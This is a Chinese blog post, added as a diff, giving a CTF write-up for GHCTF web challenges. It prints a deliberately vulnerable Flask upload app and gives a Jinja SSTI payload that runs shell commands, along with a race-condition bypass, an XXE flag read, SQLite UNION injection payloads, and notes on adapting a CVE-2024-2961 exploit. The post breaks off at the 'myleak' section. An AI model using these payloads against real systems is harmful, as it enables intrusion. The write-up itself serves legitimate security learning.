@@ -1,0 +1,658 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/blogs/img/fluid.png">
+  <link rel="icon" href="/blogs/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="upload?SSTI!(&gt;﹏&lt;)SQL???ez_readfilemyleak upload?SSTI!  源码  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GHCTF-web.misc-wp">
+<meta property="og:url" content="http://mekrina.github.io/blogs/uncategorized/GHCTF-web-misc-wp/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="upload?SSTI!(&gt;﹏&lt;)SQL???ez_readfilemyleak upload?SSTI!  源码  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-05T13:29:33.000Z">
+<meta property="article:modified_time" content="2025-03-05T13:40:29.410Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>GHCTF-web.misc-wp - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/blogs/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/blogs/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/blogs/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"mekrina.github.io","root":"/blogs/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/blogs/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/blogs/js/utils.js" ></script>
+  <script  src="/blogs/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/blogs/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/blogs/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/blogs/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/blogs/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/blogs/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/blogs/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/blogs/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="GHCTF-web.misc-wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-05 21:29" pubdate>
+          2025年3月5日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">GHCTF-web.misc-wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><a href="#1">upload?SSTI!</a><br><a href="#2">(&gt;﹏&lt;)</a><br><a href="#3">SQL???</a><br><a href="#4">ez_readfile</a><br><a href="#5">myleak</a></p>
+<h2 id="upload-SSTI"><a href="#upload-SSTI" class="headerlink" title="upload?SSTI!"></a>upload?SSTI!</h2><p><span id="1"></span></p>
+<details>
+<summary>源码</summary>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify,render_template_string,send_from_directory, abort,redirect<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename<br><br>app = Flask(__name__)<br><br><span class="hljs-comment"># 配置信息</span><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;static/uploads&#x27;</span>  <span class="hljs-comment"># 上传文件保存目录</span><br>ALLOWED_EXTENSIONS = &#123;<span class="hljs-string">&#x27;txt&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;text&#x27;</span>,<span class="hljs-string">&#x27;md&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>&#125;<br>MAX_CONTENT_LENGTH = <span class="hljs-number">16</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>  <span class="hljs-comment"># 限制上传大小为 16MB</span><br><br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER<br>app.config[<span class="hljs-string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = MAX_CONTENT_LENGTH<br><br><span class="hljs-comment"># 创建上传目录（如果不存在）</span><br>os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_safe_path</span>(<span class="hljs-params">basedir, path</span>):<br>    <span class="hljs-keyword">return</span> os.path.commonpath([basedir,path])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">contains_dangerous_keywords</span>(<span class="hljs-params">file_path</span>):<br>    dangerous_keywords = [<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;subclasses&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;__globals__&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,]<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        file_content = <span class="hljs-built_in">str</span>(f.read())<br><br><br>        <span class="hljs-keyword">for</span> keyword <span class="hljs-keyword">in</span> dangerous_keywords:<br>            <span class="hljs-keyword">if</span> keyword <span class="hljs-keyword">in</span> file_content:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># 找到危险关键字，返回 True</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <span class="hljs-comment"># 文件内容中没有危险关键字</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allowed_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">and</span> \<br>        filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>].lower() <span class="hljs-keyword">in</span> ALLOWED_EXTENSIONS<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-comment"># 检查是否有文件被上传</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;未上传文件&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>        file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br><br>        <span class="hljs-comment"># 检查是否选择了文件</span><br>        <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;请选择文件&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>        <span class="hljs-comment"># 验证文件名和扩展名</span><br>        <span class="hljs-keyword">if</span> file <span class="hljs-keyword">and</span> allowed_file(file.filename):<br>            <span class="hljs-comment"># 安全处理文件名</span><br>            filename = secure_filename(file.filename)<br>            <span class="hljs-comment"># 保存文件</span><br>            save_path = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)<br>            file.save(save_path)<br><br><br><br>            <span class="hljs-comment"># 返回文件路径（绝对路径）</span><br>            <span class="hljs-keyword">return</span> jsonify(&#123;<br>                <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;File uploaded successfully&quot;</span>,<br>                <span class="hljs-string">&quot;path&quot;</span>: os.path.abspath(save_path)<br>            &#125;), <span class="hljs-number">200</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;文件类型错误&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>    <span class="hljs-comment"># GET 请求显示上传表单（可选）</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    &lt;!doctype html&gt;</span><br><span class="hljs-string">    &lt;title&gt;Upload File&lt;/title&gt;</span><br><span class="hljs-string">    &lt;h1&gt;Upload File&lt;/h1&gt;</span><br><span class="hljs-string">    &lt;form method=post enctype=multipart/form-data&gt;</span><br><span class="hljs-string">      &lt;input type=file name=file&gt;</span><br><span class="hljs-string">      &lt;input type=submit value=Upload&gt;</span><br><span class="hljs-string">    &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 1. 过滤文件名</span><br>        safe_filename = secure_filename(filename)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> safe_filename:<br>            abort(<span class="hljs-number">400</span>, description=<span class="hljs-string">&quot;无效文件名&quot;</span>)<br><br>        <span class="hljs-comment"># 2. 构造完整路径</span><br>        file_path = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], safe_filename)<br><br>        <span class="hljs-comment"># 3. 路径安全检查</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_safe_path(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], file_path):<br>            abort(<span class="hljs-number">403</span>, description=<span class="hljs-string">&quot;禁止访问的路径&quot;</span>)<br><br>        <span class="hljs-comment"># 4. 检查文件是否存在</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(file_path):<br>            abort(<span class="hljs-number">404</span>, description=<span class="hljs-string">&quot;文件不存在&quot;</span>)<br><br>        suffix=os.path.splitext(filename)[<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(suffix)<br>        <span class="hljs-keyword">if</span> suffix==<span class="hljs-string">&quot;.jpg&quot;</span> <span class="hljs-keyword">or</span> suffix==<span class="hljs-string">&quot;.png&quot;</span> <span class="hljs-keyword">or</span> suffix==<span class="hljs-string">&quot;.gif&quot;</span>:<br>            <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&quot;static/uploads/&quot;</span>,filename,mimetype=<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> contains_dangerous_keywords(file_path):<br>            <span class="hljs-comment"># 删除不安全的文件</span><br>            os.remove(file_path)<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Waf!!!!&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            file_data = f.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        tmp_str = <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">        &lt;html lang=&quot;zh&quot;&gt;</span><br><span class="hljs-string">        &lt;head&gt;</span><br><span class="hljs-string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="hljs-string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="hljs-string">            &lt;title&gt;查看文件内容&lt;/title&gt;</span><br><span class="hljs-string">        &lt;/head&gt;</span><br><span class="hljs-string">        &lt;body&gt;</span><br><span class="hljs-string">            &lt;h1&gt;文件内容：&#123;name&#125;&lt;/h1&gt;  &lt;!-- 显示文件名 --&gt;</span><br><span class="hljs-string">            &lt;pre&gt;&#123;data&#125;&lt;/pre&gt;  &lt;!-- 显示文件内容 --&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;footer&gt;</span><br><span class="hljs-string">                &lt;p&gt;&amp;copy; 2025 文件查看器&lt;/p&gt;</span><br><span class="hljs-string">            &lt;/footer&gt;</span><br><span class="hljs-string">        &lt;/body&gt;</span><br><span class="hljs-string">        &lt;/html&gt;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(name=safe_filename, data=file_data)<br><br>        <span class="hljs-keyword">return</span> render_template_string(tmp_str)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        app.logger.error(<span class="hljs-string">f&quot;文件查看失败: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>        abort(<span class="hljs-number">500</span>, description=<span class="hljs-string">&quot;文件查看失败:&#123;&#125; &quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(e)) + request.args.get(<span class="hljs-string">&#x27;1&#x27;</span>))<br><br><br><span class="hljs-comment"># 错误处理（可选）</span><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">not_found</span>(<span class="hljs-params">error</span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: error.description&#125;, <span class="hljs-number">404</span><br><br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">403</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">forbidden</span>(<span class="hljs-params">error</span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: error.description&#125;, <span class="hljs-number">403</span><br></code></pre></td></tr></table></figure>
+</details>
+
+<p>注入点在<code>file</code>路由下的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">return</span> render_template_string(tmp_str)<br></code></pre></td></tr></table></figure>
+<p>其中<code>name</code>和<code>data</code>两个变量可控, 其中对文件名做了严格的过滤,<code>secure_filename</code>函数用了好几遍, 文件名注入应该不太可行.<br>对于文件内容只用了这样一个函数来过滤</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">contains_dangerous_keywords</span>(<span class="hljs-params">file_path</span>):<br>    dangerous_keywords = [<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;subclasses&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;__globals__&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,]<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        file_content = <span class="hljs-built_in">str</span>(f.read())<br><br><br>        <span class="hljs-keyword">for</span> keyword <span class="hljs-keyword">in</span> dangerous_keywords:<br>            <span class="hljs-keyword">if</span> keyword <span class="hljs-keyword">in</span> file_content:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># 找到危险关键字，返回 True</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <span class="hljs-comment"># 文件内容中没有危险关键字</span><br></code></pre></td></tr></table></figure>
+<p>很容易用十六进制编码绕过, 比如<code>c[&#39;\x5f\x5finit\x5f\x5f&#39;]</code>相当于<code>c.__init__</code><br>但是这里想直接用undefind类会报错, 本地运行不会报错, 可能是版本的原因.<br>可以改用<code>self.__init__</code>, self指向<code>TemplateReference</code></p>
+<p>也可以使用request绕过, payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-variable language_">self</span>[request.args.get(<span class="hljs-string">&#x27;1&#x27;</span>)][request.args.get(<span class="hljs-string">&#x27;2&#x27;</span>)][request.args.get(<span class="hljs-string">&#x27;3&#x27;</span>)][request.args.get(<span class="hljs-string">&#x27;4&#x27;</span>)](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>写wp的时候发现代码中对文件内容审查的逻辑存在<code>条件竞争</code>的漏洞</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> contains_dangerous_keywords(file_path):<br>    <span class="hljs-comment"># 删除不安全的文件</span><br>    os.remove(file_path)<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Waf!!!!&quot;</span>&#125;), <span class="hljs-number">400</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    file_data = f.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<p>只需要在<code>contains_dangerous_keywords</code>审查文件内容通过后的瞬间写入文件. 后续再读出文件内容已经变成我们的模板注入内容,所以这题waf再严格也能够通过</p>
+<h2 id="﹏"><a href="#﹏" class="headerlink" title="(&gt;﹏&lt;)"></a>(&gt;﹏&lt;)</h2><p><span id="2"></span><br>很简单的XXE, 读取&#x2F;flag即可,<br>奇怪的是前几次拿到的flag一直提交不上去,还以为是假的,白白做了半天…</p>
+<p>( ??什么? XXE变成了RCE? 那真把&#x2F;flag变成假的也可以做了…</p>
+<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL???"></a>SQL???</h2><p><span id="3"></span></p>
+<p><strong>解题关键：</strong><br><strong>非mysql的sql注入，用的数据库是sqlite</strong></p>
+<p>一开始一直按照mysql的方式注入，发现输入<code>&#39;&#39;,&#39;&quot;</code>返回hacker，想要select database()却返回500,还以为是database()、if、sys.schema_table_statistics_with_buffer等都被过滤了…</p>
+<p>直到测试<code>--database()</code>时发现, 竟然正常返回了(<code>--</code>是注释) 说明并没有过滤database(), 也就是说500是程序自动抛出的. 说明database()不符合语法. 由此可知, 采用的数据库并非mysql.<br>测试发现是sqlite:<br><strong>payload</strong><br><code>1 union select 1,1,1,1,tbl_name from sqlite_master</code> &#x3D;&gt; 表名是flag</p>
+<p><code>1 union select 1,1,1,1,sql from sqlite_master</code><br>&#x3D;&gt; 返回曾执行的sql语句记录 <code>CREATE TABLE &quot;flag&quot; ( &quot;flag&quot; TEXT)</code><br>&#x3D;&gt; 列名是flag</p>
+<p><code>1 union select 1,1,1,1,flag from flag</code></p>
+<h2 id="ez-readfile"><a href="#ez-readfile" class="headerlink" title="ez_readfile"></a>ez_readfile</h2><p><span id="4"></span><br>md5碰撞后,任意文件读取,但是把文件都读了个遍也没找到<code>flag</code>,比如<br><code>/proc/self/cmdline</code>、<code>/etc/password/environment</code>、<code>/proc/self/environ</code></p>
+<p>然后搜了下<code>file_get_contents site:xz.aliyun.com</code><br>找到了<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/8220">学习文章</a></p>
+<p>发现是<code>CVE-2024-2961</code>,iconv转化时缓冲区溢出,具体原理看不懂…, 在github上找到作者的exp。<br>远程测试和本地测试发现都不能直接用, 原因分析了半天发现<code>php://filter</code>进行base64加密的时候会吞掉最后的短块，而不会正常补齐，因此加密之后总没有<code>=</code>。因此把测试伪协议的随机生成的50字节改成51字节即可。</p>
+<h2 id="myleak"><a href="#myleak" class="headerlink" title="myleak"></a>myleak</h2><details>
+<summary>源码:</summary>
